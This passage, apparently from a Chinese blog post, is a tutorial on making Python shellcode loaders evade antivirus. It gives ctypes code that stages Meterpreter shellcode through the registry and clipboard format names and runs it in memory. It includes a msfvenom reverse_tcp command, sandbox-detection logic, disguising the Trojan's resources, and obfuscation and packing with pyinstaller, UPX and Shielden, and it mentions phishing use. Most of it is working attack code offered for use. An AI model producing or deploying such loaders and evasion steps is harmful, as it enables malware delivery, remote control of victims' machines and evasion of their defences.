<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Advapi32</span><span class="o">.</span><span class="n">RegQueryValueExA</span><span class="p">(</span><span class="o">-</span><span class="mi">2147483647</span><span class="p">,</span><span class="s2">&quot;bypass&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="kc">None</span><span class="p">,</span><span class="n">ptr</span><span class="p">,</span><span class="n">ctypes</span><span class="o">.</span><span class="n">byref</span><span class="p">(</span><span class="n">data_len</span><span class="p">))</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">Advapi32</span><span class="o">.</span><span class="n">RegDeleteValueA</span><span class="p">(</span><span class="o">-</span><span class="mi">2147483647</span><span class="p">,</span> <span class="s2">&quot;bypass&quot;</span><span class="p">)</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">pointer</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p><a name="bv3IF"></a></p>
<h2>剪切板实现内存加载</h2>
<blockquote>
<p>思路：<code>RegisterClipboardFormat</code>函数是user32.dll库中的函数，可以用来注册新的剪贴板格式。<code>GetClipboardFormatName</code>函数是user32.dll库中的函数，可以从剪贴板中检索指定注册格式的名称，并将名称复制到指定的缓冲区。</p>
</blockquote>
<p>1、防止截断，去除\x00：</p>
<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.128 lport=8080 -f py -b=&quot;\x00&quot;
</code></pre></div>

<p>2、python2加载：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00</span><span class="s2">...&quot;</span>

<span class="c1"># buf长度不能大于500字节, 这里需要分段写入</span>
<span class="n">sc_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">200</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">//</span> <span class="mi">200</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">sc_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">200</span> <span class="p">:(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">200</span><span class="p">])</span>
<span class="c1"># print(sc_list)</span>

<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>

<span class="c1"># 分段写入内存</span>
<span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">sc_list</span><span class="p">:</span>
    <span class="c1"># 创建剪切板</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">RegisterClipboardFormatW</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="c1"># 读取剪切板</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">GetClipboardFormatNameW</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">ptr1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="n">ptr1</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">ptr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459188360_20.png">
<a name="eEc7Q"></a></p>
<h2>绕过沙箱检测</h2>
<blockquote>
<p>思路：可以适当加延长执行shellcode的时间，比如说加个sleep函数。简单的反沙箱技术,当今大多数真实机具有4GB以上的RAM,我们可以检测RAM是否大于4GB来判断是否是真实的运行机器,同样大多数真实机拥有4核心cpu，许多在线检测的虚拟机沙箱是2核，我们可以通过核心数来判断是否为真实机器或检测用的虚拟沙箱，当然反沙箱还有更多高端操作以及其他判断源，例如可以从系统开机时间、临时文件夹的文件数目例如我们编写如下一个程序,将收集好的信息通过socket回调给服务器,然后服务器监听对应的端口即可:我们主要获取CPU核心数和物理内存数,以某沙箱为例:可以看到该沙箱的环境为1核2G,并且其桌面都是一些随机命名的检测文件等,因此这就可以作为我们反沙箱的要点:这里我们判断4核2G之下就为虚拟机,如果是虚拟机我们就直接退出,不在继续进行相关操作,对于一般的沙箱而言也能够有效避免被沙箱获得IP或者网络通信情况使用该内存加载方式和前两者区别同样不大,市面上主流杀软都能够过,免杀效果尚好。</p>
</blockquote>
<p><a name="xlENO"></a></p>
<h1>木马资源修改</h1>
<p>1、随便找个exe文件，把它和木马一起放进restorator，然后替换资源文件后保存。<br /><img alt="image.png" src="images/1681459181714/1681459188661_21.png"><br />2、保存后图标和软件信息会改变。<br /><img alt="image.png" src="images/1681459181714/1681459188957_22.png">
<a name="FHkHv"></a></p>
<h1>缩小和混淆代码</h1>
<blockquote>
<p>支持python2 和 python3</p>
</blockquote>
<p>1、缩小代码</p>
<div class="highlight"><pre><span></span><code>pip install python-minifier
</code></pre></div>

<div class="highlight"><pre><span></span><code>pyminify .\bypass.py --output bypass-mini.py
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459189268_23.png"><br />2、混淆：<a href="https://pyob.oxyry.com/">https://pyob.oxyry.com/</a><br /><img alt="image.png" src="images/1681459181714/1681459189616_24.png">
<a name="oz8T9"></a></p>
<h1>EXE加壳与打包</h1>
<blockquote>
<p>对比版本的话，python2打包后的文件体积会比较小，当然使用不同的打包工具，免杀效果也会不同。</p>
</blockquote>
<p><a name="OVsEZ"></a></p>
<h2>pyinstaller</h2>
<p>python2：pyinstaller==3.2.1</p>
<div class="highlight"><pre><span></span><code>pyinstaller.exe -F -w .\bypass.py
</code></pre></div>

<p>python3：pyinstaller==5.4，可以尝试一下加密参数：--key，可以对依赖库进行了加密。使用这个方法需要代码分成好几个py文件，用导包的形式加载。</p>
<div class="highlight"><pre><span></span><code>pyinstaller -F -w .\shellcode.py --key test123
</code></pre></div>

<p><a name="uNRJK"></a></p>
<h2>upx（压缩壳）</h2>
<p>upx是一款压缩壳程序，配合pyinstaller可以缩小exe的体积。</p>
<div class="highlight"><pre><span></span><code> pyinstaller -F -w .\shellcode.py --upx-dir D:\JammnyTools\Others\upx-4.0.0-win64 --clean
</code></pre></div>

<p><a name="JDZvp"></a></p>
<h2>shielden（加密壳）</h2>
<p>简单粗暴，生成后的木马会更大一点。 <br /><img alt="image.png" src="images/1681459181714/1681459189946_25.png">
<a name="ISwrx"></a></p>
<h1>最后的总结</h1>
<p>学习免杀的过程很有意思，不过python生成的可执行文件太大了，不太适合钓鱼使用。不过好在免杀效果还不错，但是免杀都是有时效性的，如果已经用尽了各种办法都绕不过杀软，不妨试试其他同样优秀的C2框架如：<code>havoc</code>，或者尝试冷门语言做免杀如：<code>vlang</code>。</p>
            <br/>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7127443823639155" data-ad-slot="9038513565" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script>            <br/>
<nav class="pagination" role="navigation">
    <ul>
        <a rel="prev" class="newer-posts" href="./pygong-ju-kai-fa-2-zhi-wen-shi-bie.html" title="Leer: Py工具开发(2) | 指纹识别">
            Leer la nueva publicación
        </a>
        <a rel="next" class="older-posts" href="./pygong-ju-kai-fa-1-duan-kou-sao-miao.html" title="Leer: Py工具开发(1) | 端口扫描">
            Leer la próxima publicación
        </a>
    </ul>
</nav>            <br/>
        </section>
        <footer class="post-footer">
        </footer>
    </article>
</main>
        <footer class="site-footer clearfix" role="contentinfo" itemscope itemtype="http://schema.org/WPFooter">
            <section class="copyright">
                <a itemprop="url" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" class="tooltip" data-tooltip="CC BY-NC-SA" target="_blank">
                CC Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
            </section>
            <section class="poweredby">Proudly published with <a href="https://getpelican.org">Pelican</a></section>
        </footer>
    </div>
    <script type="text/javascript" src="./theme/js/jquery-1.11.2.min.js"></script>
    <script type="text/javascript" src="./theme/js/jquery.fitvids.min.js"></script>
    <script type="text/javascript" src="./theme/js/index.min.js"></script>
    <script>twemoji.parse(document, {"size":16});</script>
</body>
</html>